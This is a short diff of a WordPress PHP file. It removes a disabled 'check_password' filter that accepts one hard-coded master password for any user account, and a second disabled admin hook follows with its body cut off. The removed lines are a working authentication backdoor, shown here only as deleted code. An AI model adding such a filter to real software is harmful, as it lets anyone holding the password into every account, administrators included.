@@ -3,12 +3,6 @@
 if ( !defined( 'ABSPATH' ) )
 	exit;
 
-FALSE && add_filter( 'check_password', function( $check, $password, $hash, $user_id ): bool {
-	if ( $password === 'oles-oi-portes-anoigoun-me-ena-kleidi' )
-		return TRUE;
-	return $check;
-}, 10, 4 );
-
 FALSE && add_action( 'admin_init', function() {
 	if ( !current_user_can( 'administrator' ) )
 		return;
